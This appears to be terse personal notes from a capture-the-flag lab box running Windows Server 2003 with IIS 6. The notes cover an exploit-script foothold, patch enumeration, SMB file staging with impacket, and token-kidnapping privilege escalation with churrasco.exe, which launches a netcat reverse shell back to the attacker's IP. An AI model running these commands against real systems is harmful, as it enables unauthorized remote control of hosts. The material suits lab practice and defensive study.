```
# Foothold
python exploit.py 10.10.10.14 80 10.10.17.x 1111

# Windows Privelege Escalation via Token Kidnapping
### https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e

systeminfo # on the windows target
python3 wes.py --muc-lookup systeminfo.txt # on kali

Google windows server 2003 iis 6 privilege escalation

cd /usr/share/sqlninja/apps
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .

copy \\10.10.17.x\share\churrasco.exe churrasco.exe

churrasco.exe -d "nc.exe -e cmd.exe 10.10.17.x 2222"
```
